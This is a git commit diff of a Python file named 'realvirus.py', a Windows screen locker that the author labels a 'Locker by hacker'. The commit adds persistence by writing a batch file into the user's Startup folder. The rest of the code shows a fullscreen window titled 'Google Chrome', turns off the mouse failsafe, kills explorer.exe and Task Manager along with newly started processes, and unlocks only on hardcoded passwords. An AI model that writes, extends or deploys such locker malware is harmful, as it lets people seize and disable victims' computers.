0588dc154e1085294d3d72786093bf01b75d0c50
arthurIB <arthur-borisenko>
2021-01-07 20:48:49 +0300

    next dev iteration

--- realvirus.py
+++ realvirus.py
@@ -1,19 +1,32 @@
-# from ctypes import *
+import getpass
+import os
 import subprocess
+import sys
 from time import sleep
 from tkinter import Tk, Entry, Label
-
-allow = 0
-allows = 0
 import pyautogui
 from pyautogui import click, moveTo
+import psutil
+import logging
 
-# windll.user32.BlockInput(True) #enable block
+USER_NAME = getpass.getuser()
+p = os.path.abspath(sys.argv[0])
 
-# # or
+
+def add_to_startup(file_path=""):
+    bat_path = (r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME) + '\\' + "open.bat"
+    logging.debug("bat_path = " + bat_path)
+    with open(bat_path, "w+") as bat_file:
+        path = r'start "" %s' % file_path
+        logging.debug("path = " + path)
+        bat_file.write(path)
+
+
+logging.debug("start adding to startup")
+add_to_startup(p)
+logging.debug("finished adding to startup")
 si = subprocess.STARTUPINFO()
 si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-# ok = windll.user32.BlockInput(False) #disable block
 
 root = Tk()
 width = root.winfo_screenwidth()
@@ -21,21 +34,14 @@ height = root.winfo_screenheight()
 moveTo(width / 2, height / 2)
 
 
-#
-#
 def callback(event):
     global k, entry
     if entry.get() == "vaicrkuesr" or entry.get() == "virus+hacker+algorithm" or entry.get() == "password":
         k = True
 
 
-#
-import psutil
-
-# Iterate over all running process
 for proc in psutil.process_iter():
     try:
-        # Get process name & pid from process object.
         processName = proc.name()
         processID = proc.pid
         print(processName, ' ::: ', processID)
@@ -44,44 +50,24 @@ for proc in psutil.process_iter():
 
 
 def on_closing():
-    # Кликаем в центр экрана
-    # click(width/2, height/2)
-    # Перемещаем курсор мыши в центр экрана
-
-    # Включаем полноэкранный режим
     root.attributes("-fullscreen", True)
-    # При попытке закрыть окно с помощью диспетчера задач вызываем on_closing
     root.protocol("WM_DELETE_WINDOW", on_closing)
-    # Включаем постоянное обновление окна
     root.update()
-    # Добавляем сочетание клавиш, которые будут закрывать программу
     root.bind('<Control-KeyPress-c>', callback)
 
 
-# Создаем окно
-# moveTo(width / 2, height / 2)
-# Вырубаем защиту левого верхнего угла экрана
 pyautogui.FAILSAFE = False
-# # Получаем ширину и высоту окна
-#
-# # Задаем заголовок окна
 root.title('Google Chrome')
-# # Открываем окно на весь экран
 root.attributes("-fullscreen", True)
-# # Создаем поле для ввода, задаем его размеры и расположение
 entry = Entry(root, font=1)
 entry.place(width=150, height=50, x=width / 2 - 75, y=height / 2 - 25)
-# Создаем текстовые подписи и задаем их расположение
 label0 = Label(root, text="╚(•⌂•)╝ Locker by 'hacker' (╯°□°）╯︵ ┻━┻", font=1)
 label0.grid(row=0, column=0)
 label1 = Label(root, text="Пиши пароль и жми Ctrl + C", font='Arial 20')
 label1.place(x=width / 2 - 75 - 130, y=height / 2 - 25 - 100)
-# Включаем постоянное обновление окна и делаем паузу
 root.update()
 sleep(0.2)
-# # Кликаем в центр окна
 click(width / 2, height / 2)
-# обнуляем ключ
 k = False
 
 
@@ -101,12 +87,12 @@ def killAllNotInitial(initial_set: set, current_set: set):
         except BaseException:
             print("error killing " + proc_id)
 
+
 try:
     subprocess.call("taskkill /F /IM explorer.exe", startupinfo=si)
     subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si)
 except BaseException:
     print("error killing explorer/Taskmgr")
-
 
 initial_set = getProcessIdSet()
 
